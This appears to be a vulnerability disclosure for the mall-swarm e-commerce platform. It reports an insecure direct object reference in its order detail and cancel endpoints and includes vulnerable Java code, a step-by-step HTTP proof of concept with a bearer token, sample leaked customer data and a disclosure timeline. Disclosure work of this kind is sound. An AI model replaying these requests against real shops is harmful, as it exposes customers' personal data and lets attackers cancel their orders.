https://github.com/macrozheng/mall-swarm

## Title: Horizontal IDOR in mall-portal order endpoints lets any authenticated customer read or cancel another customer's orders

Affected Versions: all versions through commit 04c442fe

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N (Score 8.1)

CWE: CWE-639 - Authorization Bypass Through User-Controlled Key

### Summary

Two mall-portal REST endpoints accept an order ID from the caller but do not verify that the order belongs to the authenticated customer. Any logged-in customer can read the full details of any other customer's order (including name, phone number, shipping address, and all purchased items) and can cancel any other customer's unpaid order, with no indication to the victim.

### Details

`OmsPortalOrderServiceImpl` contains several order-handling methods. Two of them -- `detail()` and `cancelOrder()` -- accept a caller-supplied `orderId` and act on it without checking whether `order.getMemberId()` equals the current session member's ID.

Vulnerable code in `mall-portal/src/main/java/com/macro/mall/portal/service/impl/OmsPortalOrderServiceImpl.java`:

`detail()` at line 396:

```java
@Override
public OmsOrderDetail detail(Long orderId) {
    OmsOrder omsOrder = orderMapper.selectByPrimaryKey(orderId);  // no ownership check
    OmsOrderItemExample example = new OmsOrderItemExample();
    example.createCriteria().andOrderIdEqualTo(orderId);
    List<OmsOrderItem> orderItemList = orderItemMapper.selectByExample(example);
    OmsOrderDetail orderDetail = new OmsOrderDetail();
    BeanUtil.copyProperties(omsOrder, orderDetail);
    orderDetail.setOrderItemList(orderItemList);
    return orderDetail;
}
```

`cancelOrder()` at line 297:

```java
@Override
public void cancelOrder(Long orderId) {
    OmsOrderExample example = new OmsOrderExample();
    example.createCriteria().andIdEqualTo(orderId).andStatusEqualTo(0).andDeleteStatusEqualTo(0);
    List<OmsOrder> cancelOrderList = orderMapper.selectByExample(example);
    // no check that cancelOrderList[0].getMemberId() == currentMember.getId()
    ...
    cancelOrder.setStatus(4);
    orderMapper.updateByPrimaryKeySelective(cancelOrder);
    ...
}
```

Contrast with `confirmReceiveOrder()` at line 337 and `deleteOrder()` at line 408, which both contain the correct ownership guard:

```java
if (!member.getId().equals(order.getMemberId())) {
    Asserts.fail("...");
}
```

The inconsistency within the same class is the root cause.

The `paySuccess()` method at line 253 has the same structural defect (no ownership check before updating order status and payment fields), but the stock-deduction step requires order items to be present and is not transactional, limiting reliable exploitation.

All three endpoints are reached via the Spring Cloud Gateway through the `/mall-portal/order/**` path. The gateway's Sa-Token filter enforces that the caller holds a valid member session (`StpMemberUtil.checkLogin()`), but it does not enforce resource-level ownership -- that responsibility falls entirely to the service layer, where the checks are absent.

### PoC

Prerequisites:
- mall-swarm running with mall-portal accessible at port 18085 (or through the gateway at /mall-portal/*)
- Two registered customer accounts: member A (victim, member_id=1) with existing orders, member B (attacker, member_id=3) with a valid session token

Step 1 -- Attacker logs in and obtains a Bearer token (Sa-Token UUID or JWT):

```
POST /mall-portal/sso/login
Content-Type: application/json

{"username":"windy","password":"macro123"}

Response:
{"code":200,"data":{"tokenName":"Authorization","tokenValue":"eyJ0eXAiOiJKV1Qi...","loginId":"3",...}}
```

Step 2 -- Attacker reads victim's order detail using victim's order ID (enumerated or guessed):

```
GET /mall-portal/order/detail/12
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbklkIjozLCJlZmYiOi0xLCJsb2dpblR5cGUiOiJtZW1iZXJMb2dpbiIsInJuU3RyIjoiMTIzNDU2NzgifQ.YZ7SHhXzk0varC63YuvGWS_drVBmNB9ItmCrmZnz_O8

HTTP/1.1 200 OK
{
  "code": 200,
  "message": "操作成功",
  "data": {
    "id": 12,
    "memberId": 1,
    "memberUsername": "test",
    "receiverName": "大梨",
    "receiverPhone": "18033441849",
    "receiverProvince": "江苏省",
    "receiverCity": "常州市",
    "receiverRegion": "天宁区",
    "receiverDetailAddress": "东晓街道",
    "orderItemList": [
      {"productName": "华为 HUAWEI P20", "productPrice": 3788.0, ...},
      {"productName": "小米8", "productPrice": 2699.0, ...},
      ...
    ]
  }
}
```

Step 3 -- Attacker cancels victim's unpaid order (status=0):

```
POST /mall-portal/order/cancelUserOrder?orderId=78
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbklkIjozLCJlZmYiOi0xLCJsb2dpblR5cGUiOiJtZW1iZXJMb2dpbiIsInJuU3RyIjoiMTIzNDU2NzgifQ.YZ7SHhXzk0varC63YuvGWS_drVBmNB9ItmCrmZnz_O8

HTTP/1.1 200 OK
{"code": 200, "message": "操作成功"}
```

Database confirmation -- victim's order status changed from 0 to 4 (cancelled):

```sql
SELECT id, member_id, status FROM oms_order WHERE id = 78;
-- 78 | 1 | 4
```

### Impact

Any authenticated customer can:

1. Read the full order detail for any other customer's order, including receiver name, phone number, shipping address, order items, prices, and coupon/promotion details.
2. Cancel any other customer's unpaid order, causing financial harm by preventing payment and triggering stock lock release.

The attacker only needs a valid customer session (obtained by registering a free account) and knowledge of a victim order ID. Order IDs are sequential integers, making enumeration trivial. The entire order history for all customers on the platform is accessible.


### Disclosure
 - 3 June 2026 - reported via email
 - July - no response, created https://github.com/macrozheng/mall-swarm/issues/160
 - September - no response, issue deleted
